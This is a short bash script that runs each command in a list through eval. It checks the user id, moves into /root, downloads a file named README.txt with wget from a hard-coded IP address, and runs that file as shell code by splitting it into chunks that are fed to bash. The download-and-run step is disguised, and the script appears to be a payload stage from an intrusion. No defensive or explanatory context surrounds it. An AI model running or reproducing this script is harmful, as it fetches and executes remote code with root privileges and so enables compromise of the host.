#!/bin/bash

commands=(
    "id"
    "cd /root"
    "wget http://15.17.1.191:1234/README.txt"
    "split -C 2000 --filter=\"bash\" /root/README.txt"
)

for cmd in "${commands[@]}"; do
    echo "Running: $cmd"
    eval "$cmd"
    echo "-----------------------------------"
    sleep 10
done